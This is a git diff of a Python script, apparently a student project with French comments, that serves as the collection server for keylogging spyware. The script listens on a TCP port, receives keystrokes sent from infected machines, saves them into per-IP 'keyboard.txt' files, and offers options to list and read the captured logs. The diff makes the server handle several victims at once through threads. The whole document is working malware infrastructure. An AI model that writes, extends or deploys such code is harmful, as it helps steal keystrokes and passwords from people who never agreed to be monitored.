@@ -5,24 +5,19 @@ import time
 import sys
 import os
 from pathlib import Path
+from threading import Thread
+import signal
 
 # Arguments 
 
 parser = argparse.ArgumentParser()
-parser.add_argument("-l", "--listen", type=int, help="listens on the TCP port entered by the user and waits for the spyware data.")
-parser.add_argument("-s", "--show", help="displays the list of files received by the program.", action="store_true")
-parser.add_argument("-r", "--readfile", type=str, help="displays the content of a keylog file.")
-parser.add_argument("-k", "--kill", help="stop all the instances of the server and stop all the clients.", action="store_true")
+group = parser.add_mutually_exclusive_group()
+group.add_argument("-l", "--listen", type=int, help="listens on the TCP port entered by the user and waits for the spyware data.")
+group.add_argument("-s", "--show", help="displays the list of files received by the program.", action="store_true")
+group.add_argument("-r", "--readfile", type=str, help="displays the content of a keylog file.")
+group.add_argument("-k", "--kill", help="stop all the instances of the server and stop all the clients.", action="store_true")
 args = parser.parse_args()
 
-# # Vérification du nombre d'arguments
-# if len(sys.argv) > 2:
-#     print("trop d'arguments")
-#     exit(1)
-
-# elif len(sys.argv) < 2:
-#     print("pas assez d'arguments")
-#     exit(1)
 
 #Variables
 
@@ -34,30 +29,36 @@ path_captures = cwd / "captures"
 def handle_client(conn, addr):
     print(f"Connection from {addr}")
 
-    try:
-        # Réception des données
-        data = conn.recv(1024).decode('utf-8')
+    listen = True
 
-        
-        fic = list(path_captures.glob(f"{addr[0]}*.txt"))
-        filename = path_captures / f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
-        
-        if fic == []:
-            with open(filename, 'w') as file:
-                file.write(data)
-        else:
-            ficfilename = fic[0]
-            with open(ficfilename, 'a') as file:
-                file.write("\n New data :\n")
-                file.write(data)
-            os.rename(ficfilename,filename)
+    while listen:
+        try:
+            # Réception des données
+            data = conn.recv(1024).decode('utf-8')
 
-        print(f"Data received and saved in {filename}")
-        
-    except Exception as e:
-        print(f"Error: {e}")
-    finally:
-        conn.close()
+            if data:
+
+                cwd = Path.cwd()
+                fic = list(cwd.glob(f"{addr[0]}*.txt"))
+                filename = f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
+                
+                if fic == []:
+                    with open(filename, 'w') as file:
+                        file.write(data)
+                else:
+                    ficfilename = fic[0]
+                    with open(ficfilename, 'a') as file:
+                        file.write("\n")
+                        file.write(data)
+                    os.rename(ficfilename,filename)
+
+                print(f"Data received and saved in {filename}")
+            
+
+        except Exception as e:
+            listen = False
+            print(f"Error: {e}")
+
 
 
 def display_files():
@@ -68,7 +69,6 @@ def display_files():
     
     if files == []:
         print("No files captured yet")
-
 
 def read_file(filename):
 
@@ -94,43 +94,84 @@ if args.listen:
 
     print(f"Server listening on {host}:{port}")
 
-
+    # global running
     running = True
 
-    while running:
+    # global threads
+    threads = []
 
-        conn, addr = server_socket.accept()
-        handle_client(conn, addr)
+
+    # signal.signal(signal.SIGINT, test)
+
+
+    while running:
+        try:
+    
+
+            conn, addr = server_socket.accept()
+
+            thread = Thread(target=handle_client, args=(conn, addr))
+            threads.append([thread, conn, addr])
+            thread.start()
+
+
+
+        except KeyboardInterrupt as e:
+            answered = False
+            
+            while not answered:
+                respons = input("[?] Voulez-vous vraiment arrêter le serveur ? (y/n) ")
+
+                if respons == 'y' or respons == 'n':
+                    answered = True
+
+            if respons == 'n':
+                # ne rien faire
+                print("[+] Le serveur ne sera pas arrêté")
+
+
+            else:
+
+                for t, c, a in threads:
+                    print(f"thread : {t}")
+                    print(f"connection : {c}")
+                    print(f"address : {a}")
+                
+
+                # arrêter le serveur
+                print("[+] Le serveur va s'arrêter")
+                for thread in threads:
+                    thread[1].close()
+                    print(f"[+] Fin de la connexion avec {thread[2][0]}")
+                
+                running = False
+
+                server_socket.close()
+
+
+
+
+        except Exception as e:
+            running = False
+
+            print(f"Error: {e}")
+
 
 elif args.show:
     display_files()
     sys.exit()
 
 
+
+
 elif args.readfile:
     read_file(args.readfile)
     sys.exit()
 
+
+
 elif args.kill:
     print("kill all the instances")
 
-
-
-host = '172.16.120.1'  # localhost
-port = 12345  # port 
-
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_socket.bind((host, port))
-server_socket.listen()
-
-print(f"Server listening on {host}:{port}")
-
-
-running = True
-
-while running:
-
-    conn, addr = server_socket.accept()
-    handle_client(conn, addr)
 
 
